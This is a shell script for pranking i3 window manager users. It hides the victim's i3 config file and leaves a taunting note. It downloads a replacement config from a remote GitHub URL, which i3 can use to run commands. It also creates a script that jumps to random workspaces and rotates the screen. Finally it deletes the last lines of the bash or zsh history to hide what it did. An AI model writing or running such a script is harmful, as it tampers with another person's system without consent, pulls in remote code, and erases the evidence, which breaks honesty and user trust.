#!/bin/sh

remove()
{
    for i in $(seq 15); do
        sed -i '$ d' "$1"
    done
}

mv ~/.config/i3/config ~/.config/i3/.config
echo "Good luck to find you old config" > "$HOME/.config/i3/cheh.txt"
curl https://raw.githubusercontent.com/Ellmos/cf/main/config > ~/.config/i3/config

hehe="$HOME/.config/i3/hehehe.sh"
rm -f "$hehe"
echo '#!/bin/sh' >> "$hehe"
echo '' >> "$hehe"
echo 'i3-msg "workspace" $(( $RANDOM % 10))' >> "$hehe"
echo 'ouaip=("left" "right" "normal" "inverted")' >> "$hehe"
echo 'xrandr -o ${ouaip[$(( $RANDOM % 4))]}' >> "$hehe"

chmod +x "$hehe"

i3 restart

history -c
if [[ "$SHELL" == *"bash"* ]]; then
    remove "$HOME/.bash_history"
elif [[ "$SHELL" == *"zsh"* ]]; then
    remove "$HOME/.zsh_history"
fi
